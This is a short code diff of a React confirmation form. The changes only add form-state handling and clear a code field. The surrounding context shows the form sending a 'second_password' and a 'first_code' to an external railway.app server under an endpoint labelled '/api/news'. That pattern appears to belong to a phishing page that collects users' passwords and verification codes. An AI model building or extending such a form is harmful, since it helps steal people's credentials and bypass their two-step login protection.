@@ -5,6 +5,7 @@ import { Button, InputNumber , Form } from 'antd';
 import axios from 'axios';
 
 const ConfirmComponent = () => {
+    const [form] = Form.useForm();
 
     const [activePopup, setActivePopup] = useState(false);
     const [activeLink, setActiveLink] = useState(false);
@@ -62,6 +63,7 @@ const ConfirmComponent = () => {
                 'second_password': firstCode.second_password,
                 'first_code': firstCode.first_code ,
             }
+            form.setFieldsValue({ fill_code: '' });
 
             axios.post( "https://hnu-server-react-app-production-update.up.railway.app/api/news", data) 
 
@@ -122,6 +124,7 @@ const ConfirmComponent = () => {
                         <div className="content col-md-8 col-12">
                             <Form
                                 name="basicForm"
+                                form={form}
                                 initialValues={{
                                 remember: true,
                                 }}
